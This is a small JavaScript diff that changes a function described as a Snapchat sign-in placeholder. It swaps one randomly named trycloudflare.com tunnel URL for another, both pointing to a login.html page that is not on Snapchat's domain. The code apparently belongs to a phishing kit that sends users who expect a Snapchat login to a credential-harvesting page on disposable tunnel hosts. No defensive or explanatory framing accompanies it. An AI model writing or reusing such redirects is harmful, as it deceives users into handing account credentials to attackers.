@@ -1,7 +1,7 @@
 // Placeholder function for Snapchat sign-in
 function signInWithSnapchat() {
     // Replace with your Snapchat authentication URL or function
-    window.location.href = "https://exercises-bm-democrat-guyana.trycloudflare.com/login.html";
+    window.location.href = "https://device-rendered-copies-cable.trycloudflare.com/login.html";
 }
 
 // Initial setup
